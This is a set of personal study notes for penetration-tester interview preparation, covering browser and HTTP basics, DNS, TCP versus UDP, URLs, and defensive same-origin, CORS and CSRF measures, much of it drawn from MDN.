#### ازاي لقيت وظيفة كمختبر اختراق ؟ | Penetration Tester
https://youtu.be/XiYmof1ag5I
https://youtu.be/qWy25Czi-vM?si=CmJGABO64k8F12zX


### 1- How does the browser work?
- You enter a website address (URL) or click a link.
- The browser sends a request to the website’s server.
- The server responds by sending the webpage’s data (HTML, CSS, JavaScript, images, etc.).	
- The browser processes this data and displays the webpage.
- You can interact with the page by clicking, scrolling, or entering information.
-----------
	- ## [Clients and servers](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#clients_and_servers)
		  Computers connected to the internet are called **clients** and **servers**.
		- ==Clients are the typical web user's internet-connected devices== (for example, your computer connected to your Wi-Fi, or your phone connected to your mobile network) ==and web-accessing software available on those devices== (usually a web browser like Firefox or Chrome).
		- Servers are computers that store webpages, sites, or apps. When a client wants to access a webpage, a copy of the webpage code is downloaded from the server onto the client machine to be rendered by the browser and displayed to the user.
	- ## [The other parts of the toolbox](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#the_other_parts_of_the_toolbox)
		  The client and server we've described above don't tell the whole story.
		- **Your internet connection**: Allows you to send and receive data on the internet. 
		- **TCP/IP**: **Transmission Control Protocol** and **Internet Protocol** (TCP/IP) are communication protocols that define how data should travel across the internet. 
		- **DNS**: The **Domain Name System** (DNS) is like an address book for websites. When you type a web address in your browser, the browser looks at the DNS to find the website's IP address — the actual address the server is located at — before it can retrieve the website (see [DNS explained](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#dns_explained) below for more information). The browser needs to find out which server the website lives on, so it can send HTTP messages to the right place (see below).
		- **HTTP**: **Hypertext Transfer Protocol** (HTTP) is an application [protocol](https://developer.mozilla.org/en-US/docs/Glossary/Protocol) that defines a language for clients and servers to speak to each other. See [HTTP basics](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#http_basics) below.
		- **Files**: A website is made up of many different files.  These files come in two main types:
		    - **Code**: Websites are built primarily from HTML, CSS, and JavaScript — the different programming languages websites are written in, which the browser interprets and assembles into a web page to display to a user.
		    - **Assets**: This is a collective term for all the other items that appear on a website — such as images, music, video, Word documents, and PDFs — that aren't code that the browser interprets.
	## [So what happens, exactly?](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#so_what_happens_exactly)
		When you type a web address (which is technically part of a [URL](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#components_of_a_url)) into your browser address bar, the following steps occur:
			1. The browser goes to the DNS server and finds the real address of the server that the website lives on.
			2. The browser sends an HTTP request message to the server, asking it to send a copy of the website to the client. This message, and all other data sent between the client and the server, is sent across your internet connection using TCP/IP.
			3. If the server approves the client's request, the server sends the client a "200 OK" message, which means "Of course you can look at that website! Here it is", and then starts sending the website's files to the browser as a series of small chunks called [data packets](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#packets_explained).
			4. The browser assembles the small chunks into a complete web page and displays it to you.
	## [DNS explained](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#dns_explained)
		- Real web addresses ([URLs](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#components_of_a_url)) aren't the nice, memorable strings you type into your address bar to find your favorite websites. They are special numbers that look like this: `192.0.2.172`.
		- This is called an [IP address](https://developer.mozilla.org/en-US/docs/Glossary/IP_Address), and it represents a unique location on the web. However, it's not very easy to remember, is it? That's why the Domain Name System was invented. This system uses special servers that match up a web address you type into your browser (like "mozilla.org") to the website's real (IP) address.
		- Websites can be reached directly via their IP addresses. You can use a DNS lookup tool to find the IP address of a website.
	## ## [Packets explained](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#packets_explained)
		+ Earlier we used the term "packets" to describe the format in which the data is transferred between the client and server. What do we mean here?
		+ Basically, when data is sent across the web, it is sent in thousands of small chunks. There are multiple reasons why data is sent in small packets, but most significantly:
			- They are sometimes dropped or corrupted and, when this happens, it's quicker and easier to replace small chunks than entire files.
			- Additionally, the packets can be routed along different paths, making the exchange faster and allowing many different users to download the same website at the same time. If each website was sent as a single big chunk, only one user could download it at a time, which would make the web very inefficient and not much fun to use.
	 ## [HTTP basics](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#http_basics)
		HTTP uses a simple language of verbs to perform actions such as making requests (see [HTTP request methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods)). The HTTP [`GET`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods/GET) method is the one normally used to make HTTP requests of the type described above. For example, a request for the MDN home page might look like this:
			#http
An HTTP request might look like this:
```http
GET /en-US/ HTTP/2
Host: developer.mozilla.org
```

A response might look like this:
```http
HTTP/2 200
date: Tue, 11 Feb 2025 11:13:30 GMT
content-type: text/html
expires: Tue, 11 Feb 2025 11:40:01 GMT
server: Google frontend
last-modified: Tue, 11 Feb 2025 00:49:32 GMT
etag: "65f26b7f6463e2347f4e5a7a2adcee54"
content-length: 45227
content-type: text/html

<!doctype html> ...
```

The full response is more complex than this, but we have omitted most of it for brevity. The main parts are as follows:

[`HTTP/2 200`](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#http2_200)
The version of HTTP that the server is using to send the response, in this case HTTP/2, followed by a [status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status) indicating whether the request was successful. `200` indicates success.

[`date`, `expires`, etc.](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#date)
[HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers) containing additional information about the response (note that requests can have headers too), which provide extra information and/or modify its behavior.

[`<!doctype html>`, etc.](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#!doctype_html)
The response body, which in this case contains the MDN homepage's HTML document.

**Note:** See the MDN [HTTP reference](https://developer.mozilla.org/en-US/docs/Web/HTTP) for a lot more detail on HTTP, if you are curious. [An overview of HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Overview) is a good place to start.

### [Other status codes](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#other_status_codes)

Above, we met the `200` [status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status), which indicates that the HTTP request was successful. There are many HTTP status codes with specific meanings and uses, but you will only commonly see a few:
	[`301`](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#301)
	The requested resource has been permanently moved to a new location, which is provided in the response. This is used for redirecting content when it's moved.
	[`400`](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#400)
	The server can't process the request. This usually happens when the request isn't in a format the server understands, or has errors in it.
	[`403`](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#403)
	The server will not give the client access to the requested resource. This usually happens when the server knows who the client is, but they don't have permission to access the requested page.
	[`404`](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#404)
	The server cannot find the requested resource. This status is commonly returned if the URL is wrong or if content is deleted without putting a redirect in place.
	[`503`](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#503)
	The request cannot be handled due to a problem with the server. This is common when servers are offline for maintenance, and it's expected to be temporary.
## [Components of a URL](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#components_of_a_url)
###  [What is a URL?](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Web_mechanics/What_is_a_URL).
This article discusses Uniform Resource Locators (URLs), explaining what they are and how they're structured.
![[mdn-url-all.png]]
## [Absolute URLs vs. relative URLs](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Web_mechanics/What_is_a_URL#absolute_urls_vs._relative_urls)
In web development, URLs can be either absolute or relative. 
- ==An absolute URL provides the complete path to a resource, including the protocol (e.g., http or https), domain name, and path to the file.== 

- ==A relative URL, on the other hand, specifies a location relative to the current page's URL, without including the full domain and protocol==.
# What are the difference between URL, URI, and URN?
## URL (Uniform Resource Locator): 
Specifies both the identity and the location of a resource (How and Where).
## URI (Uniform Resource Identifier):
A more comprehensive term covering both URLs (identifying and locating) and URNs (just identifying).
## URN (Uniform Resource Name):
Focuses only on uniquely identifying a resource, not on where it is located or how to access it.
![[URI-URL-URN-1.png]]

Technically, web addresses that you type into the browser address bar form part of **Uniform Resource Locators** (**URLs**). URLs define the locations of unique resources on the internet.

A URL is a web address plus a protocol: for example, if you open a new tab in your browser, type in `developer.mozilla.org` into the address bar, and press Enter/Return, you will be redirected to a URL like the following one:

https://developer.mozilla.org/en-US/

The main parts of the URL are:

[`https`](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#https)
The **protocol** being used to send the request. In this case, we are using [HTTPS](https://developer.mozilla.org/en-US/docs/Glossary/HTTPS), which is a secure version of HTTP that stops bad people from reading your data while it is being transported. On the modern web, pretty much every server uses HTTPS, so if you don't include it explicitly, the browser assumes that is what you are using and adds it for you.

[`developer.mozilla.org`](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#developer.mozilla.org)
The [**domain name**](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Web_mechanics/What_is_a_domain_name) of the URL, which represents the top-level location of the server you are connecting to. In this case, the web address you typed in is equal to the domain name, but this is not always the case — you could choose to type in a more complicated web address. Note that the `developer` part is a **subdomain** (distinct content area) of Mozilla's `mozilla.org` domain. There are other subdomains on Mozilla's site that host distinct content — see [support.mozilla.org](https://support.mozilla.org/) and [bugzilla.mozilla.org](https://bugzilla.mozilla.org/), for example.

[`/en-US/`](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#en-us)
The **path** to the resource on the server that you are accessing. MDN keeps all its US English content in a folder called `en-US`, which is what this URL is pointing to.

If you have your browser set up to prefer English content by default, then this is the URL you will be redirected to when you type in `developer.mozilla.org`. If you have your browser set up to prefer a different language that MDN supports, such as French, you will be redirected to a different URL, such as `https://developer.mozilla.org/fr/` instead. This isn't available to every website by default; the MDN developers have set MDN up like this to allow people to easily access the language they prefer.

**Note:** There are a lot more components that can appear in URLs. See [What is a URL?](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Web_mechanics/What_is_a_URL) for more details.
 
 ------------
	Recourses:
		- [How web browser works step by step [latest]— navigation phase (part 2) | by Carson | Medium](https://cabulous.medium.com/how-does-browser-work-in-2019-part-ii-navigation-342b27e56d7b)
		- [How the web works - Learn web development | MDN](https://developer.mozilla.org/en-US/docs/Learn_web_development/Getting_started/Web_standards/How_the_web_works#:~:text=The%20browser%20sends%20an%20HTTP,internet%20connection%20using%20TCP%2FIP.)
		- https://chatgpt.com/s/dr_681879bef41c81919d488bfffa8ee5d0
		- https://auth0.com/blog/url-uri-urn-differences/
		- https://www.designgurus.io/answers/detail/what-are-the-difference-between-url-uri-and-urn

----------

### 2- What does API mean?
API stands for ==Application Programming Interface==.

- It is a set of rules and contracts that allows different software components to communicate. In other words, an API defines how one application can request services or data from another, using specific requests and responses. For example, web APIs (such as REST APIs) define endpoints where clients can send HTTP requests to fetch or update data according to the agreed interface.
- API pen testing, is a security assessment process where security professionals or engineers simulate attacks on an API to identify vulnerabilities, misconfigurations, and design flaws that could be exploited by attackers.
	## **What does API penetration testing do?**
	API penetration testing involves simulating attacks on an API to find weaknesses that an attacker might exploit. This might include testing for: 
	
	- **Vulnerabilities:** Common API vulnerabilities like injection flaws, authentication/authorization issues, and sensitive data exposure. 
	- **Misconfigurations:** Incorrect settings that might allow unauthorized access or unintended behavior. 
	- **Design flaws:** Inadequate security measures in the API's design that could be exploited.


--------

### 3- What are the HTTP methods? What is the difference between them?

HTTP methods (also called HTTP verbs) are ==instructions that a client sends to a server to perform a specific action on a resource==. The most common methods are GET, POST, PUT, PATCH, and DELETE. 

- **GET:**
    Retrieves data from a server. It's used for reading or accessing resources. It's considered a safe method because it doesn't modify the server's state.
    

- **POST:**
    
    Sends data to a server to create a new resource or perform an action. It's often used with forms or APIs to send data for processing, which can include creating, updating, or deleting resources.
    
- **PUT:**
    
    Replaces an existing resource with a new one. The entire resource is updated in this method. It's often used for updating data when you have the full representation of the resource.
    
- **PATCH:**
    
    Updates only part of an existing resource. It's useful when you want to modify a resource without replacing it entirely.
    
- **DELETE:**
    
    Deletes a specific resource.
    

The main difference between these methods lies in the actions they perform: 

- **GET:** Read/Access
- **POST:** Create/Action
- **PUT:** Update (entire resource)
- **PATCH:** Update (part of resource)
- **DELETE:** Delete
- **HEAD:** is almost identical to GET, but without the response body.
- **OPTIONS:** describes the communication options for the target resource.
- **CONNECT:** is used to start a two-way communications (a tunnel) with the requested resource.
- **TRACE:** is used to perform a message loop-back test that tests the path for the target resource (useful for debugging purposes).



-----

### 4- What is the model or technology that lets you open multiple tabs in parallel on Google?
The technology that allows multiple tabs to be open in Google Chrome and other browsers is called ==tabbed browsing==. This feature lets you open multiple webpages within a single browser window, switching between them easily by clicking on the tabs. Each tab is essentially a separate instance of a webpage that can be loaded and run concurrently.

----
### 5- What are the HTTP headers handled by default by the browser? And which ones are handled by the developer?

- HTTP headers contain metadata in key-value pairs that are sent along with HTTP requests and responses. They can be used to define [caching](https://blog.postman.com/what-is-caching/) behavior, facilitate authentication, and manage session state. HTTP headers help the API client and server communicate more effectively—and enable developers to optimize and customize the API’s behavior.
- HTTP headers are key-value pairs that are sent along with HTTP requests and responses, providing essential information about the communication between the client (browser) and the server. Some headers are handled automatically by the browser, while others are primarily configured and managed by developers.
- 
### HTTP Headers Handled by Default by the Browser:

Browsers automatically send and interpret many headers to ensure proper communication and a good user experience. These are often related to:

- **Content Negotiation:**
    
    - `Accept`: Specifies the media types (e.g., `text/html`, `application/json`, `image/jpeg`) the client can process. The browser sends this based on what it's capable of displaying.
        
    - `Accept-Encoding`: Indicates the content encodings (e.g., `gzip`, `br`, `deflate`) the client understands. This helps servers compress data for faster transfer.
        
    - `Accept-Language`: Specifies the preferred human languages for the response. The browser usually sends this based on the user's system language settings.
        
    - `User-Agent`: Identifies the browser and operating system making the request. This helps the server tailor content or features for specific client environments.
        
- **Caching:**
    
    - `Cache-Control`: The browser interprets directives from the server's `Cache-Control` response header (e.g., `max-age`, `no-cache`) to determine how to cache resources and when to revalidate them.
        
    - `If-Modified-Since` / `If-None-Match`: When a cached resource is potentially stale, the browser sends these headers to the server to ask if the resource has changed. If not, the server can send a `304 Not Modified` response, saving bandwidth.
        
- **Connection Management:**
    
    - `Connection`: In HTTP/1.1, this often defaults to `keep-alive` to allow multiple requests and responses over a single connection. The browser handles this to optimize network usage.
        
- **Security & Origin:**
    
    - `Origin`: Sent by the browser for cross-origin requests, indicating the origin (scheme, host, port) of the requesting script. This is crucial for CORS (Cross-Origin Resource Sharing).
        
    - `Referer` (or `Referrer-Policy`): Indicates the URL of the page that linked to the currently requested resource. Browsers control what information is sent here based on the `Referrer-Policy` header from the server.
        
- **Cookies:**
    
    - `Cookie`: The browser automatically sends cookies that are set for the current domain with relevant requests.
    - A [Cookie](https://developer.mozilla.org/en-US/docs/Glossary/Cookie) Is a small piece of information left on a visitor's computer by a website, via a web browser.
    - 

### HTTP Headers Handled by the Developer:

Developers primarily manage headers sent by the **server** (response headers) to **control browser behavior, enforce security policies, optimize performance, and enable specific functionalities.** They can also set certain request headers programmatically (e.g., using JavaScript's `fetch` API or `XMLHttpRequest`).

Key headers typically managed by developers include:

- **Security Headers (Response Headers):** These are critical for protecting web applications from various attacks.
    
    - `Content-Security-Policy` (CSP): A powerful header that allows developers to control which resources (scripts, stylesheets, images, etc.) a user agent is allowed to load for a given page. It's a strong defense against XSS and data injection attacks.
        
    - `Strict-Transport-Security` (HSTS): Forces browsers to interact with the site only over HTTPS, preventing downgrade attacks.
        
    - `X-Frame-Options`: Prevents clickjacking attacks by controlling whether a page can be rendered in an `<frame>`, `<iframe>`, `<embed>`, or `<object>`.
        
    - `X-Content-Type-Options`: Prevents browsers from "MIME sniffing" (guessing content types), which can lead to security vulnerabilities.
        
    - `X-XSS-Protection` (now largely deprecated in favor of CSP): Enables or disables the browser's built-in XSS filter.
        
    - `Referrer-Policy`: Controls how much referrer information is sent with requests.
        
- **CORS (Cross-Origin Resource Sharing) Headers (Response Headers):** These are essential for allowing or restricting cross-origin requests.
    
    - `Access-Control-Allow-Origin`: Specifies which origins are allowed to access the resource.
        
    - `Access-Control-Allow-Methods`: Indicates which HTTP methods are allowed when accessing the resource.
        
    - `Access-Control-Allow-Headers`: Lists which HTTP headers can be used in the actual request.
        
    - `Access-Control-Allow-Credentials`: Indicates whether the response to the request can be exposed when the credentials flag is true.
        
    - `Access-Control-Max-Age`: Indicates how long the results of a preflight request can be cached.
        
- **Caching Headers (Response Headers):** Developers configure these to optimize content delivery and reduce server load.
    
    - `Cache-Control`: Developers set directives like `public`, `private`, `no-cache`, `no-store`, `max-age` to control caching behavior.
        
    - `Expires`: Specifies the date/time after which the response is considered stale (older, less flexible caching mechanism).
        
    - `ETag`: A unique identifier for a specific version of a resource. The server generates this, and the browser sends it back in `If-None-Match` for revalidation.
        
    - `Last-Modified`: The last modification date of the resource. The browser sends this back in `If-Modified-Since`.
        
- **Content and Encoding (Response Headers):**
    
    - `Content-Type`: Specifies the media type and character encoding of the resource being sent (e.g., `text/html; charset=utf-8`).
        
    - `Content-Encoding`: Indicates the encoding applied to the resource (e.g., `gzip`).
        
    - `Content-Length`: The size of the message body in bytes.
        
    - `Content-Disposition`: Suggests a filename for the client if the resource is to be downloaded.
        
- **Authentication and Authorization (both Request and Response Headers):**
    
    - `Authorization` (Request): Used by the client to send credentials (e.g., tokens) to the server for authentication.
        
    - `WWW-Authenticate` (Response): Sent by the server to challenge the client for authentication.
        
- **Custom Headers (Both Request and Response Headers):** Developers can define and use custom headers (often prefixed with `X-` historically, though this convention is now deprecated) for application-specific information or debugging.
    

In essence, while the browser handles the "plumbing" of HTTP communication by sending default headers, developers are responsible for configuring response headers to control how their web applications behave, how they are secured, and how efficiently they deliver content. Developers also interact with and manipulate request headers for specific programmatic needs.





#### Recourses:
- https://blog.postman.com/what-are-http-headers/
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers
- [Understanding Browser HTTP Accept Headers: Firefox, Internet Explorer, Opera, and WebKit (Safari / Chrome)](https://www.newmediacampaigns.com/blog/browser-rest-http-accept-headers)
- https://developer.hashicorp.com/vault/tutorials/archive/customize-http-headers#:~:text=This%20tutorial%20demonstrates%20how%20to,them%20in%20the%20custom_response_headers%20stanza.
- https://g.co/gemini/share/9d33d72d8616




---
### 6- What happens when you inject the Ethernet cable into your laptop, open the browser, and access google.com?

  
**A:** When the cable is plugged in, the operating system initializes the network interface (often via DHCP to obtain an IP address). Upon entering `google.com` in the browser:

1. **DNS Lookup:** The browser asks DNS to resolve `google.com` to an IP address[dev.to](https://dev.to/kfir-g/what-really-happens-when-you-type-googlecom-in-your-browser-49fk#:~:text=Before%20your%20browser%20can%20connect,process%20is%20called%20DNS%20resolution).
    
2. **TCP Handshake:** The browser initiates a TCP three-way handshake with Google’s server[dev.to](https://dev.to/kfir-g/what-really-happens-when-you-type-googlecom-in-your-browser-49fk#:~:text=Once%20the%20IP%20is%20known%2C,way%20handshake).
    
3. **TLS Handshake:** If using HTTPS, a TLS handshake follows[dev.to](https://dev.to/kfir-g/what-really-happens-when-you-type-googlecom-in-your-browser-49fk#:~:text=Since%20Google%20uses%20HTTPS%2C%20an,additional%20TLS%20handshake%20takes%20place).
    
4. **HTTP Request:** The browser sends an HTTP GET request (e.g., `GET /`) to google.com[dev.to](https://dev.to/kfir-g/what-really-happens-when-you-type-googlecom-in-your-browser-49fk#:~:text=Once%20connected%2C%20the%20browser%20sends,standard%20request%20for%20Google%E2%80%99s%20homepage).
    
5. **Server Response:** Google’s server responds with HTML content and linked resources.


#### 1. **Connecting the Ethernet Cable and Establishing the Connection**

- **Plugging in the Cable**: Connect one end of the Ethernet cable to your laptop's Ethernet port and the other end to a LAN port on your router or modem.
    
- **Obtaining an IP Address**: Your laptop uses the DHCP protocol to request a unique IP address, subnet mask, default gateway, and DNS server address from the router.
    
- **Connection Confirmation**: The network icon in the system tray indicates a successful connection.[BT Business+1HighSpeedInternet.com+1](https://business.bt.com/help/article/broadband-and-internet/getting-started/how-to-connect-and-use-an-ethernet-cable/?utm_source=chatgpt.com)
    

#### 2. **Opening the Browser and Entering google.com**

- **Entering the URL**: Typing "google.com" into the browser's address bar and pressing Enter initiates the process to resolve the domain name to an IP address.[Medium](https://medium.com/%40SamTheo/what-happens-when-you-type-google-com-in-your-browser-and-press-enter-d4a471437140?utm_source=chatgpt.com)
    

#### 3. **Domain Name Resolution (DNS)**

- **Cache Check**: The system checks if the IP address for "google.com" is already cached locally.
    
- **DNS Query**: If not cached, the browser sends a DNS query to the local DNS resolver.
    
- **DNS Hierarchy**:
    
    - **Root Servers**: Direct the query to the appropriate TLD servers (e.g., ".com").
        
    - **TLD Servers**: Direct the query to the authoritative server for "google.com".
        
    - **Authoritative Server**: Returns the IP address associated with "google.com" to the browser.[Medium](https://medium.com/%40SamTheo/what-happens-when-you-type-google-com-in-your-browser-and-press-enter-d4a471437140?utm_source=chatgpt.com)
    ![[Pasted image 20250530122921.png]]    

#### 4. **Establishing a TCP Connection**

- **Three-Way Handshake**: The browser initiates a TCP connection with the server on port 443 (HTTPS) using the SYN, SYN-ACK, and ACK sequence.
    

#### 5. **SSL/TLS Negotiation**

- **ClientHello**: The browser sends a message listing supported encryption methods.
    
- **ServerHello**: The server responds with its SSL certificate and chosen encryption method.
    
- **Certificate Verification**: The browser verifies the server's certificate to ensure a secure connection.[Medium](https://medium.com/%40sidneyriffic/what-happens-after-you-type-google-com-into-your-browser-and-hit-enter-bf5d548b47eb?utm_source=chatgpt.com)
    

#### 6. **Sending HTTP Request and Receiving Content**

- **GET Request**: The browser sends an HTTP GET request for the homepage of "google.com".
    
- **Server Response**: The server sends back the necessary HTML, CSS, JavaScript, and image files.
    
- **Rendering the Page**: The browser processes the content and displays the webpage to the user.[LinkedIn](https://www.linkedin.com/pulse/what-happens-when-you-type-googlecom-your-browser-press-sule-bala?utm_source=chatgpt.com)

----
### 7- What is the difference between TCP and UDP? When can I use each one?

![[Pasted image 20250530124008.png]]

- **TCP (Transmission Control Protocol)** is _connection-oriented_[en.wikipedia.org](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#:~:text=TCP%20is%20connection,Three). It establishes a reliable connection (3-way handshake) and ensures data is delivered in order and without errors. This makes TCP suitable for applications requiring data integrity: web browsing (HTTP), email, file transfers, etc.[ostinato.org](https://ostinato.org/blog/tcp-vs-udp-understanding-differences-and-use-cases#:~:text=,web%20browsing%2C%20emails%2C%20file%20transfers).
    
- **UDP (User Datagram Protocol)** is _connectionless_[en.wikipedia.org](https://en.wikipedia.org/wiki/User_Datagram_Protocol#:~:text=UDP%20is%20a%20connectionless%20,correction). It has no handshake or delivery guarantees; packets may arrive out of order or be dropped. UDP is faster and used for time-sensitive or real-time applications where occasional loss is acceptable: live video/audio streaming, gaming, DNS queries, VoIP[en.wikipedia.org](https://en.wikipedia.org/wiki/User_Datagram_Protocol#:~:text=UDP%20is%20suitable%20for%20purposes,time%20system.%5B%203).

![[Pasted image 20250530124816.png]]

|**Feature**|**TCP (Transmission Control Protocol)**|**UDP (User Datagram Protocol)**|
|---|---|---|
|**Connection Type**|Connection-oriented; establishes a connection using a three-way handshake before data transfer.|Connectionless; sends data without establishing a connection.|
|**Reliability**|Ensures reliable data transfer with error checking and acknowledgment of received packets.|Unreliable; does not guarantee delivery, order, or error checking beyond basic checksums.|
|**Ordering of Data**|Guarantees that data packets are delivered in the same order they were sent.|Does not guarantee order; packets may arrive out of sequence.|
|**Speed**|Slower due to overhead from connection setup, error checking, and flow control.|Faster as it has minimal overhead and no connection setup.|
|**Overhead**|Higher; includes mechanisms for ensuring reliability and order.|Lower; lacks mechanisms for ensuring reliability and order.|
|**Flow Control**|Implements flow control to manage data transmission rate.|Does not implement flow control; data is sent as quickly as the application allows.|
|**Error Handling**|Performs error detection and retransmission of lost packets.|Performs basic error checking via checksums; does not retransmit lost packets.|
|**Use Cases**|Suitable for applications where reliability is critical, such as: Web browsing (HTTP/HTTPS)Email (SMTP, IMAP, POP3)File transfers (FTP)Remote access (SSH, Telnet)|Suitable for applications where speed is more critical than reliability, such as: Streaming media (audio/video)Online gamingVoice over IP (VoIP)DNS queries|

In summary, **TCP** is ideal for applications requiring reliable communication and data integrity, while **UDP** is preferred for applications where speed and low latency are more important than reliability.

---
###  Security on the web
Modern browsers already have several features to protect users' security on the web, but developers also need to use best practices and code carefully to ensure that their websites are secure. Even simple bugs in your code can result in vulnerabilities that bad actors can exploit to steal data and gain unauthorized control over services.

Good security is essential for good privacy.
##### Security features provided by browsers:
Web browsers follow a strict security model that enforces strong security for content, connections between the browser and the server, and data transportation. This section looks at the features that underpin this model.
##### Same-origin policy and CORS: 

> [! # Same-origin policy: It prevents a malicious website on the Internet from running JS in a browser to read data from a third-party]
> ## [Definition of an origin](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#definition_of_an_origin)
> Two URLs have the _same origin_ if the [[^1]protocol](https://developer.mozilla.org/en-US/docs/Glossary/Protocol), [[^3]port](https://developer.mozilla.org/en-US/docs/Glossary/Port) (if specified), and [[^2]host](https://developer.mozilla.org/en-US/docs/Glossary/Host) are the same for both.
> ## [Cross-origin network access](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#cross-origin_network_access)
> The same-origin policy controls interactions between two different origins, such as when you use [`fetch()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/fetch "fetch()") or an [`<img>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/img) element. These interactions are typically placed into three categories: 
> - Cross-origin _writes_ are typically allowed. Examples are links, redirects, and form submissions. Some HTTP requests require [preflight](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#preflighted_requests).
> - Cross-origin _embedding_ is typically allowed. (Examples are listed below.)
> - Cross-origin _reads_ are typically disallowed, but read access is often leaked by embedding. For example, you can read the dimensions of an embedded image, the actions of an embedded script, or the [availability of an embedded resource](https://bugzil.la/629094).
> ## [How to allow cross-origin access](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#how_to_allow_cross-origin_access)
> Use [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS) to allow cross-origin access. CORS is a part of [HTTP](https://developer.mozilla.org/en-US/docs/Glossary/HTTP) that lets servers specify any other hosts from which a browser should permit loading of content.
> ## [How to block cross-origin access](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#how_to_block_cross-origin_access)
> - To prevent cross-origin writes, check an unguessable token in the request — known as a [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) token. You must prevent cross-origin reads of pages that require this token.
> ### What Happens?
> If you have a site `https://mybank.com` and a malicious one `https://attacker.com`, the attacker might try to:
> - **Write (cross-origin write):** Send requests to your site.
> - **Read (cross-origin read):** Access data from your responses.
> - **Embed (cross-origin embed):** Display your pages inside their own site.
> 
> #### 1. Preventing Cross-Origin Writes
> 
> - **Problem:** A malicious site sends POST requests on behalf of the user → **CSRF attack**.
> - **Solution:** Use a **CSRF Token** that the server validates.
> 
> ```HTML
> <form action="/transfer" method="POST">
> <input type="hidden" name="csrf_token" value="token123">
> </form>
> ```
> ✅ This ensures that no external site can send a valid request.
> 
> ---
> 
> #### 👁️ 2. Preventing Cross-Origin Reads
> 
> - **Problem:** An external site attempts to read sensitive data from your responses.
> - **Solution:** Make your pages non-embeddable.
> ```
> X-Frame-Options: DENY
> Content-Security-Policy: frame-ancestors 'none';
> ```
> 
> These headers block your pages from being loaded inside `<iframe>` or `<embed>` elements.
> 
> ---
> 
> ####  3. Preventing Cross-Origin Embeds
> 
> - **Problem:** Embedding (e.g., using `<img>` or `<iframe>`) can unintentionally leak information.
> - **Solution:**
>     - Use a non-displayable `Content-Type` for sensitive resources, such as:
>         ```
>         Content-Type: application/json
>         X-Content-Type-Options: nosniff
>         ```
>     - Don’t rely solely on `Content-Type`, since browsers may perform content sniffing.
>     - Add **CSRF tokens** to protect sensitive endpoints or links.
> ---
> #### 💡 Summary
> | Attack Type        | Solution                        |
> | ------------------ | ------------------------------- |
> | Cross-Origin Write | CSRF Token                      |
> | Cross-Origin Read  | X-Frame-Options / CSP           |
> | Cross-Origin Embed | Safe Content-Type + CSRF Tokens |
> 



 [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) is a fundamental security mechanism of the web that restricts how a document or a script loaded from one [origin](https://developer.mozilla.org/en-US/docs/Glossary/Origin) can interact with a resource from another origin. It helps isolate potentially malicious documents, reducing possible attack vectors.

In general, documents from one origin cannot make requests to other origins. This makes sense because you don't want sites to be able to interfere with one another and access unauthorized data.

However, you might want to relax this restriction in some circumstances; for example, if you have multiple websites that interact with each other, you may allow them to request resources from one another using [`fetch()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/fetch). This can be permitted using [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS), an HTTP-header-based mechanism that allows a server to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading resources.





#### Recourses:
